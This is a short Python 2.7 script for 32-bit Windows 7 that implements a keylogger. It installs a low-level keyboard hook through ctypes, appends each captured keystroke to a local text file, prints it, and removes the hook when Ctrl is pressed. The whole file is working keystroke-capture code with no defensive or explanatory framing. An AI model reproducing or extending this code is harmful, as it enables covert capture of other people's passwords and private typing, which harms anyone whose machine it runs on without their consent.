# -*- coding: utf-8 -*-
# python2.7
# window7 32bit
#

import sys
from ctypes import *
import ctypes
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD


user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0X0100
CTRL_CODE = 162 #这是Ctrl对应得数字

#res = []
fobj = open("hook_keyboard_res.txt", mode="a",)

class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHookProc(self, pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(
                WH_KEYBOARD_LL,
                pointer,
                kernel32.GetModuleHandleW(None),
                0
            )
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):
    CMPFUNC = ctypes.CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

#callback func
def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(lParam[0])
    fobj.write(hookedKey)
    print hookedKey

        
    if CTRL_CODE == int(lParam[0]):
        print "Ctrl pressed, Call uninstallHook()"
        keyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)


def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)

keyLogger = KeyLogger() #Here!start the hook process!
pointer = getFPTR(hookProc)

if keyLogger.installHookProc(pointer):
    print "install keyLogger"

startKeyLog()

fobj.close()













